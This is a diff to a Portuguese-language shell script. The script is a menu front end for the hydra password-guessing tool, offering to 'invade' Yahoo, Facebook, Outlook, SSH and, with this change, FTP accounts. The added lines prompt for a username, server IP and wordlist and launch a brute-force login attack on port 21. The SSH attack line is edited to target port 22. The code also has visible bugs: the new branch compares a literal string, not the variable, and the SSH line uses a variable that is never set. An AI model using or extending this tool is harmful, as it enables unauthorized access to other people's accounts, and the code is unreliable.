@@ -24,6 +24,7 @@ echo "   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOO \033[1;36m"
 echo "   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
 echo "   \033[1;33m[\033[1;31m6]>> \033[1;33mINVADIR OUTLOOK \033[1;36m"
 echo "   \033[1;33m[\033[1;31m7]>> \033[1;33mINVADIR SSH \033[1;36m"
+echo "   \033[1;33m[\033[1;31m8]>> \033[1;33mINVADIR FTP \033[1;36m"
 #
 #Escolher entre 1,2,3,4 ou 5
 #obrigado por 6usar!
@@ -117,12 +118,24 @@ echo
  echo "\033[1;36mINFORME O USER DO SERVIDOR SSH"; sleep 1
 read -p "[+]=>" usr
 echo
-hydra -l $user -P $wordlist ssh://$ip
+hydra -l $user -P $wordlist ssh://$ip:22
 #
 #Fazendo o programa dormir por 4 segundos
 sleep 4
 #
 #Saindo do Script
-
+if [ "opcao" = "8" ];then
+echo
+   echo "\033[1;36mINFORME O USUARIO DO SERVIDOR"
+read -p "[+]=>" user
+echo
+   echo "\033[1;36mINFORME O IP DO SERVIDOR"
+read -p "[+]=>" ip
+echo
+   echo "\033[1;36mINFORME INFOME O DIRETORIO DA SUA LISTA DE SENHA"
+read -p "[+]=>" wordlist
+#
+#
+hydra -l $user -P $wordlist ftp://$ip:21
 exit
 
